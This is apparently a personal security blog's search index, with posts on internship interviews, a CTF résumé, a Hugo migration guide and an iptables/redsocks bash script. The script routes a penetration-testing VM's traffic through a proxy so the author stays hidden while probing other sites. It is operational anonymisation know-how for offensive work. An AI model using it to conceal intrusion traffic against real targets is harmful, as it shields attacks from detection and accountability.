[{"categories":["draft"],"content":"对暑期实习投递的总结 今年的情况也太惨烈了点，去年看学长投递，起码暑期实习还是比较顺利的，还真是“未来五年永远都是未来五年内最好的一年”。 先讲讲自身情况吧，茯苓是对安全攻防方向比较感兴趣，所以一开始就想找蓝军相关岗位，但是今年真是 buff 叠满，蓝军这个岗位本身呢，技术力要求很高，加上今年基本不怎么招人，所以就是地狱难度，但是茯苓呢比较固执，所以今年投实习也是拖了很久，最后还是确定来了北京美团，现在才来写这个总结。 我将总结放在开头，感兴趣的读者可以看每个公司的总结。 ","date":"2023-06-24","objectID":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/:0:0","tags":null,"title":"暑期实习投递总结","uri":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/"},{"categories":["draft"],"content":"小作文 现在我正坐在北京的合租房中，现在距离暑期实习第一次投递，已经过去了三个多月，这三个多月，我有过兴奋，有过期待，有过失望，有过难过，太多的感觉，到今天已经没那么强烈，但我深知今年投递的难度。 我不断的反思自己，首先，大家都喜欢要求代码能力，就算是安全岗位，也应当要有适当的代码能力；其次，学习东西要深入到细节中去，不要似懂非懂，大差不大；最后，想做蓝军，最好不要走 ctf 赛道，走 hw 赛道，做攻防也可以先从防御做起，因为蓝军的技术力要求很高，而且攻防本身是转换的，不是绝对的。 其实我很喜欢对未来的事情做出预想和判断，但是这次投递，我感到很多不应该做的，本应该做的，情况已经远超我的想象了，对于未来我说实话是真的很迷惘，但是现在，我已经坐在了北京的合租房中，这绝不是我一开始的想法，虽然现在一切都是变化的，我已然身处在变化中，那便，拥抱变化吧。 接下来我按照投递顺序来对每家做个小总结，不涉及面试细节，只聊感受。 ","date":"2023-06-24","objectID":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/:0:1","tags":null,"title":"暑期实习投递总结","uri":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/"},{"categories":["draft"],"content":"美团 美团是有笔试的，而且笔试难度很高，我觉得不是我这种网安人能做出来的，不过捞人的线倒是挺低的。一开始，我被应用安全部门的面试官捞起了，这位面试官很好，但是我很想去蓝军方向，他这边不太符合，和他聊聊了，最后就结束了我的流程。然后我就被评估应急部门捞起了，这个部门就比较符合我的预期了，面试官最后给我说，我学的东西太浅，需要更深入一点，不然走不远的，很感谢他的指点。这个部门我也是走到了主管面，主管面还是一样的说法，实战经验不足，需要做一个真实环境内网的渗透可能会好一点。美团这里也是比较巧，这面之后，我其实是被挂掉了，但是后来又捞了起来，我问我主管，他说：“缘分”。 ","date":"2023-06-24","objectID":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/:0:2","tags":null,"title":"暑期实习投递总结","uri":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/"},{"categories":["draft"],"content":"拼多多 多子是有笔试的，但是难度就没那么高，我觉得连我都可以接受。多子应该是大部门招聘，所以面试我的一直是安全部的面试官，第一位面试官比较偏业务层，但我还是表达我想去蓝军岗位。二面的面试官是数据安全相关的，问了很多数据安全相关的东西，这方面我确实了解不多，所以我们谈的不是很投缘，但是他也表示理解。到了主管面，就是很正常的问简历，问职业发展与规划什么的，这位面试官好像比较在乎我的编码能力。最后也是无缘 pdd，不久之后就收到感谢信。 ","date":"2023-06-24","objectID":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/:0:3","tags":null,"title":"暑期实习投递总结","uri":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/"},{"categories":["draft"],"content":"百度 百度也是有笔试的，百度是选择简答这种题型。这次面的就是蓝军的岗位，但是百度这边的话，应该是只要一位或者两位，所以竞争很激烈。这边问了很多很深入很细节的问题，也对应了之前面试美团的时候，面试官强调的要深入理解学习的说法，我确实还达不到这个要求，加上我没有蓝军统一要求的 hw 经验，也是第一面就被刷掉了。 ","date":"2023-06-24","objectID":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/:0:4","tags":null,"title":"暑期实习投递总结","uri":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/"},{"categories":["draft"],"content":"腾讯 腾讯是有笔试的，但是好像不怎么看重这个？一开始先面试了玄武，这一面当时有点没准备好，托大了，问了一个很细节的 java 安全相关问题，我也是没答上来，后面的渗透实战感觉答的也是比较一般，不出意外挂了。后来就面试了科恩，科恩这次倒是运气好，完成了主管终面，感觉几面已经是发挥到了极致，不过还是有更加 match 的同学拿下了这个名额，这也正常。最后还有个腾讯数据安全部门面试我，由于完全不会，所以也不再赘述了。 ","date":"2023-06-24","objectID":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/:0:5","tags":null,"title":"暑期实习投递总结","uri":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/"},{"categories":["draft"],"content":"阿里 阿里没有笔试，真的爱了。阿里这边我面了阿里云的反入侵团队，我当时一直表达我想做蓝军方向，虽然两次面试的面试官好像一直在说蓝军技术力要求很高，让我拓宽一下思路，但是我当时有点思维僵化了，事后想起来是无比后悔，蓝军这种岗位，一般不招实习生，要么转正要么真的很牛逼，我之前的赛道一直是 ctf，从来也不是攻防，所以，先从反入侵入手也是很对的，毕竟攻防不分家嘛，事后想起来就是很后悔。 ","date":"2023-06-24","objectID":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/:0:6","tags":null,"title":"暑期实习投递总结","uri":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/"},{"categories":["draft"],"content":"蚂蚁 蚂蚁无笔试，我找学长内推了天穹，这边情况和百度一样，要求很高，hc很少，基本上都是当作正式员工去招聘的，我 hw 经验太少，意料之中的落榜。 ","date":"2023-06-24","objectID":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/:0:7","tags":null,"title":"暑期实习投递总结","uri":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/"},{"categories":["draft"],"content":"华为 用国奖免掉了笔试。这下我真是体会到了华子招聘的感觉了，开得最晚，拖得最久，池子最大，消息最假。（以上只是友好吐槽，有夸张成分，权当友好吐槽，华为还是很好的企业）。华子的面试问题没那么难，一面轻松过，主管面也是笑着聊天。可惜最后杳无音讯，不了了之了，我其实想去华子的意愿还是比较强的。 ","date":"2023-06-24","objectID":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/:0:8","tags":null,"title":"暑期实习投递总结","uri":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/"},{"categories":["draft"],"content":"京东 京东没有笔试，这边面试我的是京东云的，问了很多比较细节的东西，一些很细节的东西确实有些说不上来，也是一面挂掉了。 ","date":"2023-06-24","objectID":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/:0:9","tags":null,"title":"暑期实习投递总结","uri":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/"},{"categories":["draft"],"content":"荣耀 荣耀的笔试难度也不是很高，两面都很常规，也是顺利的 oc 了，但是当时有着美团和华为两家，所以我最后也是没有接受荣耀的 oc。 ","date":"2023-06-24","objectID":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/:0:10","tags":null,"title":"暑期实习投递总结","uri":"/%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92%E6%80%BB%E7%BB%93/"},{"categories":["渗透测试"],"content":"Linux 全局代理脚本 ","date":"2023-02-03","objectID":"/%E5%AF%B9-linux-%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E7%9A%84%E6%8E%A2%E7%B4%A2/:0:0","tags":null,"title":"对 Linux 全局代理的探索","uri":"/%E5%AF%B9-linux-%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E7%9A%84%E6%8E%A2%E7%B4%A2/"},{"categories":["渗透测试"],"content":"前言 众所周知，我们在网上“探索”别人网站的时候，通常都需要挂上代理来隐藏自己。茯苓目前的需求是，虚拟机使用物理机开出来的局域网代理来隐藏自己，但是没有好的工具可以实现 Linux 的全局代理，于是茯苓便不断探索学习并写出了一个小工具。 茯苓目前的方案是这样的，物理机用作 CTF 等日常的使用；开第一个虚拟机用来进行渗透行为，受限于一些条件，茯苓目前只能用 Kali 来渗透；开第二个虚拟机用来进行调试网上拉下来的代码以及运行一些不确定安全性的软件。茯苓给这组方案起名为面具系统，以后有机会详细描述下配置的具体细节。（又挖一个坑） 对于 Windows 和 MacOS 用户，我们可以使用 Proxifier 来实现进程级的代理，好用程度，谁用谁知道。但是 Linux 用户就没用这么好的运气了，而网上几乎很难找到靠谱的方案，现在开始讲述茯苓的探索血泪史。 ","date":"2023-02-03","objectID":"/%E5%AF%B9-linux-%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E7%9A%84%E6%8E%A2%E7%B4%A2/:0:1","tags":null,"title":"对 Linux 全局代理的探索","uri":"/%E5%AF%B9-linux-%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E7%9A%84%E6%8E%A2%E7%B4%A2/"},{"categories":["渗透测试"],"content":"最常见的 proxychains 茯苓打开浏览器一搜索“Linux 全局代理”，大多数都是这种方案。都是清一色的给浏览器设置代理，然后对于工具，都在命令行里面使用 proxychains 作为前缀来套一层代理，网上全是这种，茯苓这里就不再赘述。这种方式确实能解决一些问题，但是用起来极其不方便。 ","date":"2023-02-03","objectID":"/%E5%AF%B9-linux-%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E7%9A%84%E6%8E%A2%E7%B4%A2/:0:2","tags":null,"title":"对 Linux 全局代理的探索","uri":"/%E5%AF%B9-linux-%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E7%9A%84%E6%8E%A2%E7%B4%A2/"},{"categories":["渗透测试"],"content":"倾旋大佬的透明代理方式 就在某一个月黑风高的夜晚，茯苓突然搜到了一个链接Linux透明代理在红队渗透中的应用，我终于看到了一些曙光。 详细的内容可以看链接，这里茯苓简单介绍一下几个关键点。 iptables iptables 是 Linux 管理员用来设置 IPv4 数据包过滤条件和 NAT 的命令行工具。可以设置规则轻松地重定向传入流量，实现将流量导入 socks 代理。 redsocks redsocks 是一个能够重定向socks代理的一款开源软件，它允许我们在系统上监听一个端口，与远程socks端口进行转换，并且支持socks5认证。 透明代理 透明代理的意思是客户端根本不需要知道有代理服务器的存在，它改变你的 request fields（报文），并会传送真实 IP，多用于路由器的 NAT 转发中。加密的透明代理则是属于匿名代理。 那么总结一下来说就是，利用 iptables 重定向流量到一个端口，利用 redsocks 将该端口流量转化为 socks 代理即我们的代理，这样就可以形成一种透明代理。我们的 linux 访问网站时，会被防火墙拦截，然后通过代理发送到目标网站。对于 linux 系统来说，它以为自己是直接访问了目标网站，而不知道被代理了。 在学习了他的脚本以后，茯苓往顺手修改了一下， #!/bin/bash # redsocks 配置 redsocks_bin_path=\"redsocks\" redsocks_config_file_path=\"/etc/redsocks.conf\" shell_log_path=\"/tmp/socks-switch.log\" # 代理配置 sed_tool(){ sed -i $1'd' $redsocks_config_file_path sed -i $1\"i\\ $2\" $redsocks_config_file_path } set_proxy(){ # 行号 内容 # type sed_tool '52' 'type = socks5;' # ip sed_tool '47' 'ip = 10.37.129.2' # port sed_tool '48' 'port = 7890' socks_loging \"set proxy ...\" } # 记录日志 socks_loging(){ current_time=$(date +\"%Y-%m-%d %H:%M:%S\"); echo \"[*] \"$current_time \": \" $1 \u003e\u003e $shell_log_path echo \"[*] \"$current_time \": \" $1 } # 开启 redsocks start_redsocks(){ $redsocks_bin_path -c $redsocks_config_file_path socks_loging \"start redsocks ...\" } # 关闭 redsocks stop_redsocks(){ pkill redsocks socks_loging \"stop redsocks ...\" } # 重置 iptalbes 不影响其他规则 reset_iptables(){ ids=`iptables -t nat -nL OUTPUT --line-number | grep REDSOCKS | awk '{print $1}'` if [ ! -z \"$ids\" ]; then id_array=(${ids//\\\\n/ }) #socks_loging \"REDSOCKS OUTPUT Chian ID : $id_array\" for id in ${id_array[@]} do id=`echo $id|egrep -o \"[0-9]{1,4}\"` if [ $id != \"\" ]; then iptables -t nat -D OUTPUT $id #iptables -t nat -D PREROUTING $id fi done fi #socks_loging \"No Set Iptables ...\" iptables -t nat -nvL REDSOCKS \u003e /dev/null 2\u003e\u00261 if [ \"$?\" != \"1\" ]; then iptables -t nat -F REDSOCKS iptables -t nat -X REDSOCKS fi socks_loging \"reset iptables ...\" } # 清除全部 iptables clean(){ iptables -t nat -F iptables -t nat -X iptables -t nat -P PREROUTING ACCEPT iptables -t nat -P POSTROUTING ACCEPT iptables -t nat -P OUTPUT ACCEPT iptables -t mangle -F iptables -t mangle -X iptables -t mangle -P PREROUTING ACCEPT iptables -t mangle -P INPUT ACCEPT iptables -t mangle -P FORWARD ACCEPT iptables -t mangle -P OUTPUT ACCEPT iptables -t mangle -P POSTROUTING ACCEPT iptables -F iptables -X iptables -P FORWARD ACCEPT iptables -P INPUT ACCEPT iptables -P OUTPUT ACCEPT iptables -t raw -F iptables -t raw -X iptables -t raw -P PREROUTING ACCEPT iptables -t raw -P OUTPUT ACCEPT socks_loging \"clean iptables ...\" } # 浏览模式 browse(){ iptables -t nat -A REDSOCKS -d 10.0.0.0/8 -j RETURN iptables -t nat -A REDSOCKS -d 127.0.0.0/8 -j RETURN iptables -t nat -A REDSOCKS -d 169.254.0.0/16 -j RETURN iptables -t nat -A REDSOCKS -d 172.16.0.0/12 -j RETURN iptables -t nat -A REDSOCKS -d 192.168.0.0/16 -j RETURN iptables -t nat -A REDSOCKS -p tcp -j REDIRECT --to-port 12345 socks_loging \"browse mode ...\" } # 内网模式 intranet(){ set_proxy iptables -t nat -A REDSOCKS -p tcp -d 10.0.0.0/8 -j REDIRECT --to-port 12345 iptables -t nat -A REDSOCKS -p tcp -d 172.0.0.0/8 -j REDIRECT --to-port 12345 iptables -t nat -A REDSOCKS -p tcp -d 192.168.0.0/16 -j REDIRECT --to-port 12345 socks_loging \"intranet mode ...\" } # 自定义模式 diy(){ socks_loging \"diy mode ...\" } # 载入防火墙 install(){ stop_redsocks reset_iptables iptables -t nat -N REDSOCKS iptables -t nat -A REDSOCKS -d $proxy_ip -j RETURN if [ \"$1\" = \"browse\" ]; then browse fi if [ \"$1\" = \"intranet\" ]; then intranet fi if [ \"$1\" = \"diy\" ]; then diy fi iptables -t nat -A OUTPUT -p tcp -m owner ! --uid-owner $redsocks_user -j REDSOCKS start_redsocks } # banner if [ -z \"$1\" ]; then echo \"[*] Usage proxy : 配置代理 browse : 浏览模式 intranet : 内网模式 diy : 自定义模式 reset : 重制 iptables 不影响其他规则 clean : 清空 iptables 所有规则 stop : 重制 iptables 并关闭代理 \" exit 0 fi if [ \"$1\" = \"proxy\" ]; then set_proxy exit 0 fi if [ \"$1\" = \"browse\" ]; then install $1 exit 0 fi if [ \"$1\" = \"intranet\" ]; then install $1 exit 0 fi if [ \"$1\" = \"diy\" ]; the","date":"2023-02-03","objectID":"/%E5%AF%B9-linux-%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E7%9A%84%E6%8E%A2%E7%B4%A2/:0:3","tags":null,"title":"对 Linux 全局代理的探索","uri":"/%E5%AF%B9-linux-%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E7%9A%84%E6%8E%A2%E7%B4%A2/"},{"categories":["渗透测试"],"content":"茯苓基于 GOST 的透明代理 https://latest.gost.run/tutorials/redirect/是 GOST 关于透明代理的用法，原理上也是 redsocks 的重定向，但是 GOST 将该功能集成在自身，茯苓测试操作之后，利用 GOST v3 重写了 Linux 全局代理脚本。 脚本 vanish 启动脚本以后，这台虚拟机上的外网的所有流量都会走代理，而不需要其他操作 准备 需要先去https://latest.gost.run/下载对应平台的 GOST 二进制文件 操作介绍 将 shell 脚本下载到本地以后，先用 chmod +x vanish.sh添加权限 mix 选项 tcp 选项 udp 选项 inner 选项，需要先开启前面其中一个选项，开启这个以后可以将自身流量代理进入内网 off 选项，会关闭 gost 并且清除工具添加的 iptables 规则而不影响其他规则 clean 选项，会删除日志，日志默认位置在log=\"/tmp/vanish.log\"，可以自行修改 ","date":"2023-02-03","objectID":"/%E5%AF%B9-linux-%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E7%9A%84%E6%8E%A2%E7%B4%A2/:0:4","tags":null,"title":"对 Linux 全局代理的探索","uri":"/%E5%AF%B9-linux-%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E7%9A%84%E6%8E%A2%E7%B4%A2/"},{"categories":["渗透测试"],"content":"结语 有了这个脚本，茯苓就可以物理机开启一个代理，然后渗透虚拟机使用局域网代理来隐藏自身了！！！ 总得来说，茯苓是借助了 GOST 这个工具，而 GOST v3 还没正式发布，如果后面有什么变动茯苓会继续更新 vanish。 茯苓认为，Linux 上全局代理的关键就是 iptables 的运用，但是茯苓对于 iptables 掌握得并不是很精通，全是现学的，规则上可能有很多不完善不优雅的地方，欢迎各位师傅交流指正。 ","date":"2023-02-03","objectID":"/%E5%AF%B9-linux-%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E7%9A%84%E6%8E%A2%E7%B4%A2/:0:5","tags":null,"title":"对 Linux 全局代理的探索","uri":"/%E5%AF%B9-linux-%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E7%9A%84%E6%8E%A2%E7%B4%A2/"},{"categories":["渗透测试"],"content":"参考文章 Linux透明代理在红队渗透中的应用 ","date":"2023-02-03","objectID":"/%E5%AF%B9-linux-%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E7%9A%84%E6%8E%A2%E7%B4%A2/:0:6","tags":null,"title":"对 Linux 全局代理的探索","uri":"/%E5%AF%B9-linux-%E5%85%A8%E5%B1%80%E4%BB%A3%E7%90%86%E7%9A%84%E6%8E%A2%E7%B4%A2/"},{"categories":null,"content":"晨星_茯苓's friends","date":"2023-01-10","objectID":"/friends/","tags":null,"title":"友情链接","uri":"/friends/"},{"categories":null,"content":"说明 # 互换友链请按照以下格式留言 - nickname: 晨星_茯苓 avatar: https://poriams.github.io/avatar.jpg url: https://poriams.github.io description: 每个魔法都有它的代价 ","date":"2023-01-10","objectID":"/friends/:1:0","tags":null,"title":"友情链接","uri":"/friends/"},{"categories":null,"content":"ID: 晨星_茯苓 / Poria Morningstar / Poria “茯苓”，取自我国中药材，学者贾所学用“假松之真液而生，受松之灵气而结”形容它聚天地灵气；而“晨星”，取自反叛天使路西法·晨星中的 “Morningstar”，意味着光明使者 “the Lightbringer”。 Team：@X1cT34m @SU 安全爱好者，CTFer， Web 安全研究，渗透攻防，红蓝对抗 随手记录下经历： 2023 3.30 第七届 XCTF 国际网络攻防联赛-Dota x CTF @X1cT34m 亚军 3.30 第七届 XCTF 国际网络攻防联赛-决赛 @X1cT34m 一等奖 3.19 西湖论剑 2022 网络安全大赛-决赛 @X1cT34m 三等奖 2.2 西湖论剑 2022 网络安全大赛-初赛 @X1cT34m 2nd 2022 12.3 “东华杯” 2021 网络安全大赛-决赛 @X1cT34m 一等奖 10.30 第三届“祥云杯”网络安全大赛-初赛 @X1cT34m 23rd 9.18 2020 XCTF 高校网络安全专题挑战赛-决赛 @X1cT34m 三等奖 9.17 第五届美团网络安全高校挑战赛-初赛 @X1cT34m 20th 5.23 ~ 8.25 于杭州安恒信息公司 任高级安全研究实习生一职 8.24 全国大学生信息安全竞赛-决赛 @X1cT34m 二等奖 8.21 第六届“强网杯”全国安全挑战赛-决赛 @X1cT34m 三等奖 8.18 2022巅峰极客-初赛 @X1cT34m 4th 8.17 投稿《二次反序列化 看我一命通关》于跳跳糖社区 7.31 第六届“强网杯”全国安全挑战赛-初赛 @X1cT34m 27th 7.22 2022 数字中国创新大赛虎符网络安全赛道-决赛 @X1cT34m 26th 7.16 第二届“鹏城杯”联邦靶场协同攻防演练-决赛 @X1cT34m 优胜奖 7.02 第二届“鹏城杯”联邦靶场协同攻防演练-初赛 @X1cT34m 3rd 6.25 第七届 XCTF 国际联赛分站赛 ACTF-线上赛 @X1cT34m 20th 6.19 全国大学生信息安全竞赛-华东北赛区-决赛 @X1cT34m 一等奖 5.29 全国大学生信息安全竞赛-华东北赛区-初赛 @X1cT34m 3rd 4.16 第七届 XCTF 国际联赛分站赛 *CTF-线上赛 @X1cT34m 14th 3.22 第二届“红明谷”杯数据安全大赛-初赛 @X1cT34m 27th 3.20 2022 数字中国创新大赛虎符网络安全赛道-初赛 @X1cT34m 13th 3.11 西湖论剑 2021 网络安全大赛-决赛 @X1cT34m 优胜奖 2.26 第七届 XCTF 国际联赛分站赛 SUSCTF-线上赛 @X1cT34m 7th 2021 12.25 第七届 XCTF 国际联赛分站赛 SCTF-线上赛 @X1cT34m 5th 12.19 第四届美团网络安全高校挑战赛-决赛 @SU 二等奖 12.11 第四届美团网络安全高校挑战赛-初赛 @SU 7th 12.01 参与某车联网渗透测试项目 11.13 第七届 XCTF 国际联赛分站赛 L3HCTF-线上赛 @X1cT34m 20th 11.20 西湖论剑 2021 网络安全大赛-初赛 @X1cT34m 53rd 11.14 第七届“湖湘杯”网络安全大赛-初赛 @X1cT34m 138th 11.13 深育杯网络安全大赛-高校组-初赛 @X1cT34m 58th 11.12 第四届“强网“拟态防御国际精英挑战赛-决赛 @X1cT34m 三等奖 10.31 “东华杯” 2021 网络安全大赛-初赛 @X1cT34m 3rd 10.16 第三届字节跳动“安全范儿“高校挑战赛-初赛 @X1cT34m 39th 10.14 2021“绿城杯”网络安全大赛-决赛 @X1cT34m 三等奖 09.23 第二届“天翼杯”网络安全攻防大赛-决赛 @X1cT34m 优秀奖 09.16 第三届“第五空间”网络安全-社企组-初赛 @SU 11th 09.11 第七届 XCTF 国际联赛分站赛 RCTF-线上赛 @X1cT34m 4th ","date":"2023-01-10","objectID":"/about/:0:0","tags":null,"title":"关于我","uri":"/about/"},{"categories":["建站记录"],"content":"从 Hexo 迁移到 Hugo ","date":"2023-01-10","objectID":"/%E4%BB%8E-hexo-%E5%88%B0-hugo/:0:0","tags":null,"title":"从 Hexo 到 Hugo","uri":"/%E4%BB%8E-hexo-%E5%88%B0-hugo/"},{"categories":["建站记录"],"content":"前言 自茯苓我从 Windows 投向 Macos 的怀抱以后，真是有好多东西要做迁移，加上 M1 架构的生态并不是那么好，茯苓的迁移进程就慢到起飞。本来打算这两天写一篇博客，这才意识到，之前的 hexo 博客没做迁移，以前一直就听说 hugo 优点很多，干脆心一横，枪在手，跟我走，杀 hexo，抢 hugo！ ","date":"2023-01-10","objectID":"/%E4%BB%8E-hexo-%E5%88%B0-hugo/:0:1","tags":null,"title":"从 Hexo 到 Hugo","uri":"/%E4%BB%8E-hexo-%E5%88%B0-hugo/"},{"categories":["建站记录"],"content":"安装 安装 Hugo Mac 直接使用 brew 安装即可 brew install hugo 生成站点 生成博客文件夹 hugo new site Bitter_Tree/Blog 先 cd 到博客文件夹，后续操作都在博客文件夹下 安装皮肤 茯苓这里选取的是 FixIt 主题，集大成者 git init git submodule add https://github.com/hugo-fixit/FixIt.git themes/FixIt 创建页面 填写网站根目录的配置文件 config.toml title = \"我的全新 Hugo FixIt 网站\" baseURL = \"http://example.org/\" # 设置默认的语言 [\"en\", \"zh-cn\", \"fr\", \"pl\", ...] defaultContentLanguage = \"zh-cn\" # 网站语言, 仅在这里 CN 大写 [\"en\", \"zh-CN\", \"fr\", \"pl\", ...] languageCode = \"zh-CN\" # 是否包括中日韩文字 hasCJKLanguage = true # 更改使用 Hugo 构建网站时使用的默认主题 theme = \"FixIt\" [params] # FixIt 主题版本 version = \"0.2.X\" [menu] [[menu.main]] identifier = \"posts\" # 你可以在名称（允许 HTML 格式）之前添加其他信息，例如图标 pre = \"\" # 你可以在名称（允许 HTML 格式）之后添加其他信息，例如图标 post = \"\" name = \"文章\" url = \"/posts/\" # 当你将鼠标悬停在此菜单链接上时，将显示的标题 title = \"\" weight = 1 # 向菜单项添加用户定义的内容 [menu.main.params] # 添加 CSS 类到菜单项 class = \"\" # 是否为草稿菜单，类似草稿页面 draft = false # 添加 fontawesome 图标到菜单项 icon = \"fa-solid fa-archive\" # 设置菜单项类型，可选值：[\"mobile\", \"desktop\"] type = \"\" [[menu.main]] identifier = \"categories\" pre = \"\" post = \"\" name = \"分类\" url = \"/categories/\" title = \"\" weight = 2 [menu.main.params] icon = \"fa-solid fa-th\" [[menu.main]] identifier = \"tags\" pre = \"\" post = \"\" name = \"标签\" url = \"/tags/\" title = \"\" weight = 3 [menu.main.params] icon = \"fa-solid fa-tags\" # Hugo 解析文档的配置 [markup] # 语法高亮设置 (https://gohugo.io/content-management/syntax-highlighting) [markup.highlight] # false 是必要的设置 (https://github.com/hugo-fixit/FixIt/issues/43) noClasses = false 创建一个关于页面和文章页面 hugo new posts/test.md 启动 Hugo hugo server -D 就会在本地启动博客了 ","date":"2023-01-10","objectID":"/%E4%BB%8E-hexo-%E5%88%B0-hugo/:0:2","tags":null,"title":"从 Hexo 到 Hugo","uri":"/%E4%BB%8E-hexo-%E5%88%B0-hugo/"},{"categories":["建站记录"],"content":"配置 网站基础配置 https://fixit.lruihao.cn/zh-cn/theme-documentation-basics/#site-configuration 这里有详细的配置，参照这个配置文件做改动 茯苓的建议是把他的配置文件直接复制到博客根目录下，不要去主题文件夹里面修改 这步茯苓主要是做一些网站图片，网站名称的修改，值得一提的是该主题本身就有关于和友链页面，可以直接创建并修改菜单栏 魔改 css 目前这个主题还未提供更换背景的功能，只能自己魔改了 首先在网站根目录下创建 assets/css 文件夹，在里面添加 _custom.scss body { background-image: url(/background.jpg); background-size: cover; background-position: top 20px center; background-repeat: no-repeat; background-attachment: fixed; } header#header-desktop.desktop.animate__faster { backdrop-filter: blur(10px); background: hsla(0, 0%, 100%, 0.8) linear-gradient(90deg, rgba(247,149,51,0.15) 0, rgba(243,112,85,0.15) 15%, rgba(239,78,123,0.15) 30%, rgba(161,102,171,0.15) 44%, rgba(80,115,184,0.15) 58%, rgba(16,152,173,0.15) 72%, rgba(7,179,155,0.15) 86%, rgba(109,186,130,0.15) 100%); [data-theme='dark'] \u0026 { background-color: $header-background-color-dark; } } main.container, footer.footer { background-color: rgba($color: $global-background-color, $alpha: 0.45); [data-theme='dark'] \u0026 { background-color: rgba($color: $global-background-color-dark, $alpha: 0.9); } } 这是茯苓的配置，对黑夜效果也做了适配，效果图为 添加评论系统 茯苓货比三家最后选择了 Waline 评论系统，可以参照官方文档配置，非常详细，记得配置评论提醒功能哦 这里贴一下 config [params.page.comment.waline] enable = true serverURL = \"\" pageview = true # FixIt 0.2.15 | 新增 emoji = [\"//unpkg.com/@waline/emojis@1.1.0/weibo\"] meta = [\"nick\", \"mail\", \"link\"] requiredMeta = [\"nick\", \"mail\"] login = \"enable\" wordLimit = 0 pageSize = 10 imageUploader = true # FixIt 0.2.15 | 新增 highlighter = true # FixIt 0.2.15 | 新增 comment = true # FixIt 0.2.15 | 新增 texRenderer = true # FixIt 0.2.16 | 新增 search = true # FixIt 0.2.16 | 新增 recaptchaV3Key = \"\" # FixIt 0.2.16 | 新增 修改 fontawesome 茯苓根据自己的情况，创建了一个 fontawesome 模版，放在博客根目录的 archetypes 文件夹下，建一个 posts.md title: \"{{ replace .TranslationBaseName \"-\" \" \" | title }}\" date: {{ .Date }} Lastmod: password: message: \"此地无银三百两\" comment: true weight: 0 categories: - draft resources: - name: featured-image src: featured-image.png 文章迁移 茯苓以前也都不怎么写博客，有很多文章的年限都比较久了，就挑了一篇二次反序列化，以及 JavaSE 的笔记迁过来，要改动的地方就是头部的那些，没啥难度就是有点麻烦耗时间 部署到 github 仓库 需要部署在 GitHub Pages 上，首先在GitHub上创建一个 Repository，仓库名必须跟自己的用户名一样用户名.github.io 然后运行hugo命令创建 public 页面，然后建立本地和 github 仓库的连接 hugo cd public git init git add . git commit -m \"updating site on $(date)\" git remote add origin https://github.com/PoriaMs/poriams.github.io.git git push -u origin main 与远程仓库建立连接时，现在不能使用用户名密码登录，需要申请令牌，会有提示文档，照着操作就好 以后每次更新只需要 hugo cd public git add . git commit -m \"updating site on $(date)\" git push origin main 添加 google 分析 添加这个可以帮助茯苓统计网站流量 申请好 ID 之后填上去即可 [params.analytics] enable = true # Google Analytics [params.analytics.google] id = \"\" # 是否匿名化用户 IP anonymizeIP = true 添加 SEO Google 第一步 先去 https://search.google.com/search-console 点击添加资源，选择 URL 方式导入，输入 URL，然后下载弹出 